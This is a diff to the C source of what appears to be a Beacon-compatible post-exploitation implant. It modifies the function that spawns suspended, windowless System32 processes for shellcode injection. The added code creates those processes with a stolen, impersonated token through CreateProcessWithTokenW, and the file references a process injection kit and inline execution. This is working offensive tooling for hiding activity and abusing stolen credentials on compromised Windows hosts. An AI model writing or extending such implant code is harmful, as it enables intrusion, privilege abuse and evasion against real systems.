@@ -4,6 +4,7 @@
 #include "Config.h"
 #include "Package.h"
 #include "BeaconCompatibility.h"
+#include "Identity.h"
 
 /* This file requires the COFF loader for Process Injection Kit capabilities */
 #if defined(INCLUDE_CMD_INJECT_SHELLCODE) || defined(INCLUDE_CMD_INLINE_EXECUTE)
@@ -286,17 +287,21 @@ BOOL CreateTemporaryProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hP
 {
 
 	CHAR lpPath   [MAX_PATH * 2];
+	WCHAR lpPathW [MAX_PATH * 2];
 	CHAR WnDr     [MAX_PATH];
 
 	STARTUPINFO            Si    = { 0 };
+	STARTUPINFOW           Siw   = { 0 };
 	PROCESS_INFORMATION    Pi    = { 0 };
 
 	// Cleaning the structs by setting the element values to 0
 	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
+	RtlSecureZeroMemory(&Siw, sizeof(STARTUPINFOW));
 	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
 
 	// Setting the size of the structure
 	Si.cb = sizeof(STARTUPINFO);
+	Siw.cb = sizeof(STARTUPINFOW);
 
 	// Getting the %WINDIR% environment variable path (That is generally 'C:\Windows')
 	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
@@ -307,23 +312,53 @@ BOOL CreateTemporaryProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hP
 	// Creating the target process path
 	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
 
-	// Creating the process
-	if (!CreateProcessA(
-		NULL,
-		lpPath,
-		NULL,
-		NULL,
-		FALSE,
-		CREATE_SUSPENDED | CREATE_NO_WINDOW,		// Instead of CREATE_SUSPENDED
-		NULL,
-		NULL,
-		&Si,
-		&Pi)) {
-		_dbg("[!] CreateProcessA Failed with Error : %d", GetLastError());
+	// Creating the process - use stolen token if available
+	BOOL processCreated = FALSE;
+	if ( gIdentityToken != NULL )
+	{
+		_dbg("\t Using impersonated token for process creation");
+		
+		/* Convert path to wide characters for CreateProcessWithTokenW */
+		if (MultiByteToWideChar(CP_ACP, 0, lpPath, -1, lpPathW, sizeof(lpPathW) / sizeof(WCHAR)) == 0)
+		{
+			DWORD error = GetLastError();
+			_err("\t Failed to convert path to wide char: %d", error);
+			return FALSE;
+		}
+		
+		processCreated = CreateProcessWithTokenW(
+			gIdentityToken,   // Token handle
+			0,                // Logon flags
+			NULL,             // Application name
+			lpPathW,          // Command line (wide char)
+			CREATE_SUSPENDED | CREATE_NO_WINDOW, // Creation flags
+			NULL,             // Environment
+			NULL,             // Current directory
+			&Siw,             // Startup info (wide char)
+			&Pi);             // Process information
+	}
+	else
+	{
+		processCreated = CreateProcessA(
+			NULL,
+			lpPath,
+			NULL,
+			NULL,
+			FALSE,
+			CREATE_SUSPENDED | CREATE_NO_WINDOW,
+			NULL,
+			NULL,
+			&Si,
+			&Pi);
+	}
+
+	if ( !processCreated )
+	{
+		_dbg("[!] Process creation failed with Error : %d", GetLastError());
 		return FALSE;
 	}
 
-	// Filling up the OUTPUT parameter with CreateProcessA's output
+	// Filling up the OUTPUT parameter with CreateProcess's output
 	*dwProcessId        = Pi.dwProcessId;
 	*hProcess           = Pi.hProcess;
 	*hThread            = Pi.hThread;
